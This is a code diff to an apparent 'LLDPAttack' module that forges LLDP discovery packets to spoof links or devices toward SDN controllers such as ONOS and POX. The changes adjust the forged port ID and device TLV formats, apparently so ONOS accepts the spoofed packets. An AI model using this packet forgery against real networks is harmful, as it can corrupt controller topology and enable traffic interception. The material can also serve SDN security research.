@@ -21,8 +21,7 @@
 # ids[2] is LLDP chassis ID, defaults to host MAC address
 # ids[3] is LLDP port ID, defaults to 0
 # For ONOS:
-#   ids[4] is LLDP Name TLV, defaults to "ONOS Discovery"
-#   ids[5] is LLDP Device TLV, defaults to "dpid:" + host MAC
+#   ids[4] is LLDP Device TLV, defaults to "dpid:" + host MAC
 # For POX:
 #   ids[4] is System Description TLV, defaults to "dpid:" + host MAC
 # Otherwise:
@@ -214,9 +213,9 @@ class LLDPAttack(Module):
         portid = LLDPPortId()
         portid.subtype = 2
         if ids[3] is not None:
-            portid.value = ids[3]
+            portid.value = "\0"*(len(ids[3])-4) + ids[3]
         else:
-            portid.value = "\0"
+            portid.value = "\0\0\0\0"
         tlv_list.append(portid)
         ttl = LLDPTTL()
         tlv_list.append(ttl)
@@ -233,9 +232,9 @@ class LLDPAttack(Module):
         tlv.oui = 0xA42305
         tlv.subtype = 2
         if ids[4] is not None:
-            tlv.value = "dpid:" + ids[4]
+            tlv.value = "of:" + ids[4]
         else:
-            tlv.value = "dpid:" + self.eth
+            tlv.value = "of:" + self.eth
         tlv_list.append(tlv)
         end = LLDPDUEnd()
         tlv_list.append(end)
